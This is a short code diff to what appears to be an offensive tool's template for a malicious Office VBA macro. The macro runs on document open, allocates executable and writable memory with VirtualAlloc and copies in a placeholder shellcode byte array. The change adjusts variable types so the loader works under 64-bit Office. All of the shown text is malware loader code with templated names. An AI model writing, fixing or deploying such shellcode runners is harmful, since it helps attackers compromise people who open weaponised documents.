@@ -848,11 +848,11 @@ Private Declare Function RtlMoveMemory Lib \"kernel32\" (ByVal #{var_lDest} As L
 #EndIf
 
 Sub Auto_Open()
-	Dim #{var_myByte} As Long, #{var_myArray} As Variant, #{var_res} As Long, #{var_offset} As Long
+	Dim #{var_myByte} As Long, #{var_myArray} As Variant, #{var_offset} As Long
 #If Vba7 Then 
-	Dim  #{var_rwxpage} As LongPtr
+	Dim  #{var_rwxpage} As LongPtr, #{var_res} As LongPtr
 #Else 
-	Dim  #{var_rwxpage} As Long
+	Dim  #{var_rwxpage} As Long, #{var_res} As Long
 #EndIf
 	#{var_myArray} = Array(#{bytes})
 	#{var_rwxpage} = VirtualAlloc(0, UBound(#{var_myArray}), &H1000, &H40)
